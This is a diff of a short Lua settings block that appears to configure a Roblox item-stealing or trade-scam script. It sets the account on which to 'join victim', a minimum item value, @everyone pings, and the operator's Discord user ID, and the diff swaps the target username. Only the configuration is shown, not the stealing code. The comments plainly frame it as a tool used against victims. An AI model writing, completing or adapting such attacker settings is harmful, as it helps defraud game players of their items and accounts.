@@ -1,4 +1,4 @@
-_G.Username = "boondock138" -- user you should join victim on
+_G.Username = "nbvbw" -- user you should join victim on
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.discuser = "1269701634217480267" -- change to your Discord user ID
